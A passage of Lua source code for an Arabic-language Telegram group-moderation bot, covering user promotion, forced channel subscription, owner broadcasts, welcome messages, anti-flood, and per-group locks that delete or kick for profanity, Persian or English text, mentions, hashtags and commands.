for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t.."︙"..k.." >  ([@"..username.."])\n"
else
end
end
if #list == 0 then
t = "• لا يوجد مميز العام"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("رفع مميز عام") and msg.reply_to_message_id_ and SudoBot(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• عذراً عـليك الاشـتࢪاك في قنـاة البـوت اولآ\n•قناة الاشتراك ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Mamez:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n• العضو > ['..data.first_name_..'](t.me/'..(data.username_ or 'Revorb0t')..') '
status  = '\n• الايدي > '..result.sender_user_id_..' \n تم ترقيته مميز عام في البوت'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^رفع مميز عام @(.*)$") and SudoBot(msg) then
local username = text:match("^رفع مميز عام @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• عذراً عـليك الاشـتࢪاك في قنـاة البـوت اولآ\n•قناة الاشتراك ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"• عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Mamez:User', result.id_)
usertext = '\n• العضو > ['..result.title_..'](t.me/'..(username or 'Revorb0t')..')'
status  = '\n تم ترقيته مميز عام في البوت'
texts = usertext..status
else
texts = '• لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false 
end
if text and text:match("^رفع مميز عام (%d+)$") and SudoBot(msg) then
local userid = text:match("^رفع مميز عام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'•  𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝒓𝒆𝒗𝒐𝒓 •\n• لايمكنك استخدام البوت •\n• عليك الاشتراك في القناة •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'•]')
end
return false
end
database:sadd(bot_id..'Mamez:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n• العضو > ['..data.first_name_..'](t.me/'..(data.username_ or 'Revorb0t')..') '
status  = '\n تم ترقيته مميز عام في البوت'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n• العضو > '..userid..''
status  = '\n تم ترقيته مميز عام في البوت'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text == ("تنزيل مميز عام") and msg.reply_to_message_id_ and SudoBot(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'•  𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝒓𝒆𝒗𝒐𝒓 •\n• لايمكنك استخدام البوت •\n• عليك الاشتراك في القناة •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'•]')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Mamez:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n• العضو > ['..data.first_name_..'](t.me/'..(data.username_ or 'Revorb0t')..') '
status  = '\n• الايدي > '..result.sender_user_id_..' \n تم تنزيله من المميز العام'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^تنزيل مميز عام @(.*)$") and SudoBot(msg) then
local username = text:match("^تنزيل مميز عام @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'•  𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝒓𝒆𝒗𝒐𝒓 •\n• لايمكنك استخدام البوت •\n• عليك الاشتراك في القناة •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'•]')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Mamez:User', result.id_)
usertext = '\n• العضو > ['..result.title_..'](t.me/'..(username or 'Revorb0t')..')'
status  = '\n تم تنزيله من المميز العام'
texts = usertext..status
else
texts = '• لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مميز عام (%d+)$") and SudoBot(msg) then
local userid = text:match("^تنزيل مميز عام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'•  𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝒓𝒆𝒗𝒐𝒓 •\n• لايمكنك استخدام البوت •\n• عليك الاشتراك في القناة •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'•]')
end
return false
end
database:srem(bot_id..'Mamez:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n• العضو > ['..data.first_name_..'](t.me/'..(data.username_ or 'Revorb0t')..') '
status  = '\n تم تنزيله من المميز العام'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n• العضو > '..userid..''
status  = '\n تم تنزيله من المميز العام'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text and not Special(msg) then  
local DRAGON1_Msg = database:get(bot_id.."DRAGON1:Add:Filter:Rp2"..text..msg.chat_id_)   
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ العضو ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
end
if database:get(bot_id..'Set:Name:Bot'..msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ' then   
send(msg.chat_id_, msg.id_," ◉ تم الغاء حفظ اسم البوت")
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
return false  
end 
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
database:set(bot_id..'Name:Bot',text) 
send(msg.chat_id_, msg.id_, " ◉ تم حفظ الاسم")
return false
end 
if database:get(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ◉' then   
send(msg.chat_id_, msg.id_," ◉ تم الغاء الاذاعه للخاص")
database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id..'User_Bot') 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,'['..msg.content_.text_..']')  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
send(msg.chat_id_, msg.id_," ◉ تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")
database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end

if database:get(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ◉' then   
send(msg.chat_id_, msg.id_," ◉ تم الغاء الاذاعه")
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id..'Chek:Groups') 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,'['..msg.content_.text_..']')  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
send(msg.chat_id_, msg.id_," ◉ تمت الاذاعه الى >>{"..#list.."} جروب في البوت ")
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end

if database:get(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ◉' then   
send(msg.chat_id_, msg.id_," ◉ تم الغاء الاذاعه")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = database:smembers(bot_id..'Chek:Groups')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
send(msg.chat_id_, msg.id_," ◉ تمت الاذاعه الى >>{"..#list.."} جروبات في البوت ")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
if database:get(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ◉' then   
send(msg.chat_id_, msg.id_," ◉ تم الغاء الاذاعه")
database:del(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = database:smembers(bot_id..'User_Bot')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
send(msg.chat_id_, msg.id_," ◉ تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")
database:del(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
if database:get(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, " ◉ تم الغاء الامر ")
database:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
database:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local username = string.match(text, "@[%a%d_]+") 
tdcli_function ({    
ID = "SearchPublicChat",    
username_ = username  
},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, ' ◉ المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, ' ◉ عذا لا يمكنك وضع معرف حسابات في الاشتراك ')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,' ◉ عذا لا يمكنك وضع معرف جروب بالاشتراك ')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,' ◉ البوت ادمن في القناة \n ◉ تم تفعيل الاشتراك الاجباري في \n ◉ ايدي القناة ('..data.id_..')\n ◉ معرف القناة ([@'..data.type_.channel_.username_..'])')
database:set(bot_id..'add:ch:id',data.id_)
database:set(bot_id..'add:ch:username','@'..data.type_.channel_.username_)
else
send(msg.chat_id_, msg.id_,' ◉ عذرآ البوت ليس ادمن بالقناه ')
end
return false  
end
end,nil)
end
if database:get(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, " ◉ تم الغاء الامر ")
database:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
database:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
database:set(bot_id..'text:ch:user',texxt)
send(msg.chat_id_, msg.id_,' ◉ تم تغيير رسالة الاشتراك ')
end

local status_welcome = database:get(bot_id..'Chek:Welcome'..msg.chat_id_)
if status_welcome and not database:get(bot_id..'lock:tagservr'..msg.chat_id_) then
if msg.content_.ID == "MessageChatJoinByLink" then
tdcli_function({ID = "GetUser",user_id_=msg.sender_user_id_},function(extra,result) 
local GetWelcomeGroup = database:get(bot_id..'Get:Welcome:Group'..msg.chat_id_)  
if GetWelcomeGroup then 
t = GetWelcomeGroup
else  
t = '\n•نورتنا يا حج 🌝💘•  \n•  name \n• user' 
end 
t = t:gsub('name',result.first_name_) 
t = t:gsub('user',('@'..result.username_ or 'لا يوجد')) 
send(msg.chat_id_, msg.id_,'['..t..']')
end,nil) 
end 
end

if msg.content_.ID == "MessageChatAddMembers" then 
if msg.content_.members_[0].id_ == tonumber(bot_id) then 
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "الفا")
tdcli_function ({ID = "GetUser",user_id_ = bot_id,},function(arg,data) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = bot_id,offset_ = 0,limit_ = 1},function(extra,result,success) 
if result.photos_[0] then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
},
{
{text = 'اضف البوت الي مجموعتك ↯', url = "https://t.me/"..data.username_.."?startgroup=new"},
},
}
local msg_id = msg.id_/2097152/0.5
local Texti = "٭ مرحبا انا بوت "..N.." \n↞ اختصاصي ادارة المجموعات من السبام والخ..\n↞ للتفعيل ارفعني مشرف وارسل تفعيل في المجموعه ."
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Texti)..'&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end,nil)
end,nil)
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.photo_ then  
if database:get(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) then 
if msg.content_.photo_.sizes_[3] then  
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_ 
else 
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_ 
end 
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,' ◉ عذرآ البوت ليس ادمن بالقناه ')
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,' ◉ … عذرآ البوت لايملك صلاحيات')
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
else
send(msg.chat_id_, msg.id_,' ◉ تم تغيير صورة الجروب')
end
end, nil) 
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
end   
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," ◉ تم الغاء وضع الوصف")
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)
return false  
end 
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
https.request('https://api.telegram.org/bot'..token..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
send(msg.chat_id_, msg.id_,' ◉ تم تغيير وصف الجروب')
return false  
end 
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," ◉ تم الغاء حفظ الترحيب")
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
database:set(bot_id..'Get:Welcome:Group'..msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,' ◉ تم حفظ ترحيب الجروب')
return false   
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) then
if text == 'الغاء' then
send(msg.chat_id_,msg.id_," ◉ تم الغاء حفظ الرابط")
database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false
end
if text and text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)") then     
local Link = text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)")   
database:set(bot_id.."Private:Group:Link"..msg.chat_id_,Link)
send(msg.chat_id_,msg.id_," ◉ تم حفظ الرابط بنجاح")
database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end 
--------------------------------------------------------------------------------------------------------------
if DRAGON_Msg and not Special(msg) then  
local DRAGON_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if DRAGON_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ◉ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ◉ ["..DRAGON_Msg.."] \n")
else
send(msg.chat_id_,0," ◉ العضو : {["..data.first_name_.."](T.ME/so_alfaa )}\n ◉ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end
end
--------------------------------------------------------------------------------------------------------------
if not Special(msg) and msg.content_.ID ~= "MessageChatAddMembers" and database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") then 
floods = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") or 'nil'
NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 5
TIME_CHECK = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") or 5
local post_count = tonumber(database:get(bot_id..'floodc:'..msg.sender_user_id_..':'..msg.chat_id_) or 0)
if post_count > tonumber(database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 5) then 
local ch = msg.chat_id_
local type = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") 
trigger_anti_spam(msg,type)  
end
database:setex(bot_id..'floodc:'..msg.sender_user_id_..':'..msg.chat_id_, tonumber(database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") or 3), post_count+1) 
local edit_id = data.text_ or 'nil'  
NUM_MSG_MAX = 5
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") then
NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") 
end
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") then
TIME_CHECK = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") 
end 
end 
--------------------------------------------------------------------------------------------------------------
if text and database:get(bot_id..'lock:Fshar'..msg.chat_id_) and not Special(msg) then 
list = {"كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Fars'..msg.chat_id_) and not Special(msg) then 
list = {"ڄ","گ","که","پی","خسته","برم","راحتی","بیام","بپوشم","گرمه","چه","چ","ڬ","ٺ","چ","ڇ","ڿ","ڀ","ڎ","ݫ","ژ","ڟ","ݜ","ڸ","پ","۴","زدن","دخترا","دیوث","مک","زدن", "خالی بند","عزیزم خوبی","سلامت باشی","میخوام","سلام","خوببی","ميدم","کی اومدی","خوابیدین"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Engilsh'..msg.chat_id_) and not Special(msg) then 
list = {'a','u','y','l','t','b','A','Q','U','J','K','L','B','D','L','V','Z','k','n','c','r','q','o','z','I','j','m','M','w','d','h','e'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id..'lock:text'..msg.chat_id_) and not Special(msg) then       
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
return false     
end     
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then 
database:incr(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) 
end
if msg.content_.ID == "MessageChatAddMembers" and not Special(msg) then   
if database:get(bot_id.."lock:AddMempar"..msg.chat_id_) == 'kick' then
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
chat_kick(msg.chat_id_,mem_id[i].id_)
end
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatJoinByLink" and not Special(msg) then 
if database:get(bot_id.."lock:Join"..msg.chat_id_) == 'kick' then
chat_kick(msg.chat_id_,msg.sender_user_id_)
return false  
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("@[%a%d_]+") or msg.content_.caption_:match("@(.+)") then  
if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("@[%a%d_]+") or text and text:match("@(.+)") then    
if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("#[%a%d_]+") or msg.content_.caption_:match("#(.+)") then 
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("#[%a%d_]+") or text and text:match("#(.+)") then
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("/[%a%d_]+") or msg.content_.caption_:match("/(.+)") then  
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("/[%a%d_]+") or text and text:match("/(.+)") then
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if not Special(msg) then 
